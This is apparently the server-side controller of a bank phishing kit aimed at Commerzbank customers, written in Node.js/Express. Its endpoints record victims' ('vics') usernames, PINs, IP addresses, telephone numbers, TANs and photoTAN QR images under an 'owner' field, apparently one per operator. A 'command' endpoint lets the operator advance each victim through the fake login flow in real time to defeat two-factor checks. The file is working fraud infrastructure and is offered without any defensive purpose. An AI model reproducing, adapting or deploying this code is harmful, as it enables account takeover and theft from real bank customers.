const Commerz = require("../models/commerzModel");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    Commerz.find({ owner })
        .sort({ status: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, qrLink, status } = req.body;
    try {
        if (qrLink) {
            await Commerz.findOneAndUpdate({ uniqueid }, { status, qrLink }).exec();
        } else {
            await Commerz.findOneAndUpdate({ uniqueid }, { status }).exec();
        }
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    Commerz.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, pin, uniqueid, owner, ip } = req.body;
    try {
        await Commerz.create({
            uniqueid,
            username,
            pin,
            status: 1,
            owner,
            ip,
        });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, pin, uniqueid } = req.body;
    try {
        await Commerz.findOneAndUpdate(
            { uniqueid },
            { username, pin, status: 0 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTelephone = async (req, res) => {
    const { telephone, uniqueid } = req.body;
    try {
        await Commerz.findOneAndUpdate(
            { uniqueid },
            { telephone, status: 5 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTan = async (req, res) => {
    const { tan, uniqueid } = req.body;
    try {
        await Commerz.findOneAndUpdate(
            { uniqueid },
            { tan, status: 7 }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitQr = async (req, res) => {
    if (!req.files) {
        return res.status(500).send({ msg: "file is not found" });
    }
    let { qr } = req.files;
    let { uniqueid } = req.body;
    const frontPath = `./commerzQr/${uniqueid}_QR.jpg`;
    try {
        await qr.mv(frontPath, async (err) => {
            if (err) {
                console.log(err);
                return res.sendStatus(500);
            }
        });
        await Commerz.findOneAndUpdate({ uniqueid }, { qr: true, status: 3 }).exec();
        res.sendStatus(200);
    } catch (e) {
        console.log(e)
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await Commerz.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getQr = async (req, res) => {
    const { uniqueid } = req.params;
    res.sendFile(`/commerzQr/${uniqueid}_QR.jpg`, { root: '.' })
}

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitQr,
    submitTelephone,
    deleteEntry,
    getQr,
    submitTan
};
